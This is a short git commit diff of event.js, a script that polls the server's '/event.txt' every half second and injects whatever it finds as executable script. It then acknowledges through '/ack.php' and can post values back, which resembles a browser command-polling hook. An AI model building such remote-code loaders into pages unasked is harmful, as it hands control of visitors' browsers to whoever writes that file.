80c18a01a36bacdcd25f0ceb56dfcd0ce9b065c2
Gydo Kosten <gydokosten@MacBook-Pro.local>
2017-03-08 21:23:12 +0100

    v1

--- event.js
+++ event.js
@@ -1,23 +1,44 @@
 var postdata = "default_postback";
-function main() {
+
+function ack() {
+    var ackReq = new XMLHttpRequest();
+    ackReq.open("GET", "/ack.php",false);
+    ackReq.send();
+    
+}
 
 
-var script = document.createElement("script");
-script.src = "http://127.0.0.1/event.txt";
-script.type = "application/javascript";
-document.head.appendChild( script );
+function handler() {
+    console.log("handler run");
+    
+    if(this.status == 200) {
+        var script = document.createElement("script");
+        script.src = "/event.txt";
+        script.type = "application/javascript";
+        document.head.appendChild( script );
+        ack();
+    }
+    else
+    {
+        console.log("XHR status returned " + this.status + ", wich is not 200"); //its likely 404 so we can assume the host has no code for us to execute.
+    }
+}
 
-};
+function testEventFile() {
+    var xhr = new XMLHttpRequest();
+    xhr.addEventListener("load", handler);
+    xhr.open("GET", "/event.txt");
+    xhr.send();
+}
 
-function postback() {
+function postback(postdata) {
 	var posturl = "/post.php?postback=" + postdata;
 	console.log(posturl);
 	var xmlHTTP = new XMLHttpRequest();
 	xmlHTTP.open("GET", posturl, false);
 	xmlHTTP.send();
-	return 0;
 };
 
 
 
-setInterval(function(){main()}, 8000)
+setInterval(function(){testEventFile()}, 500);
